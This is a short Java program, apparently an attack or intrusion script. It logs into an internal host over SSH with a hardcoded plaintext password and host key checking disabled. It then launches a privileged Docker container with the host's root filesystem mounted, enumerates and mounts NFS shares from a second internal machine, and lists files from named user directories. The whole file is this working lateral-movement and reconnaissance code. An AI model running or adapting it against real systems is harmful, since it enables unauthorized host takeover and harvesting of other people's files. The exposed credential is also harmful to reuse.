import com.jcraft.jsch.*;
import java.io.*;
class DKC {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Try mounting NFS from 10.14.16.20 using privileged Docker container
    ch.setCommand("docker run --rm --privileged --net=host -v /:/hostfs ubuntu:22.04 bash -c 'apt-get update -qq && apt-get install -y -qq nfs-common > /dev/null 2>&1; mkdir -p /mnt/nfs; showmount -e 10.14.16.20 2>&1; mount -t nfs 10.14.16.20:/mnt/tmp/temp_1/export /mnt/nfs 2>&1 && echo MOUNT_OK && ls /mnt/nfs/ && find /mnt/nfs/neo/ /mnt/nfs/noxify/ -type f 2>/dev/null | head -20 || echo MOUNT_FAIL' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
